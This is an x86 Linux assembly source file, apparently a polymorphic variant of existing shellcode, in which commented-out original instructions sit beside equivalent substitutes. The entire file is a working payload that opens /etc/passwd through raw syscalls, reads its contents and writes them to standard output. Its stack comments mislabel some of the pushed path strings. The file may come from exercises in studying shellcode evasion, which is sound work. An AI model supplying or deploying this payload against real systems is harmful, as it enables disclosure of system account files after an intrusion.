global _start

section .text
_start:
    xor ecx,ecx
    mul ecx

    mov al,0x5      ; open()
    push ecx
    push dword 0x64777373       ; "dwss"
    ; push dword 0x61702f63       ; "ap/c"
    ; push dword 0x74652f2f       ; "te//"
    push dword 0x61702f2f       ; "ap/c"
    push dword 0x6374652f       ; "te//"
    
    mov ebx,esp
    int 0x80

    xchg eax,ebx
    xchg eax,ecx
    mov al,0x3       ; read()

    ; xor edx,edx       
    ; edx is already cleared from `mul` instruction above 

    ; mov dx,0xfff
    ; inc edx
    mov dx, 0x1001
    dec edx

    int 0x80

    xchg eax,edx

    ; xor eax,eax
    sub eax, eax
    
    mov al,0x4          ; write()
    mov bl,0x1        ; STDOUT
    int 0x80

    ; xchg eax,ebx        ; mov 0x1 into eax, exit()
    mov al, 0x1

    int 0x80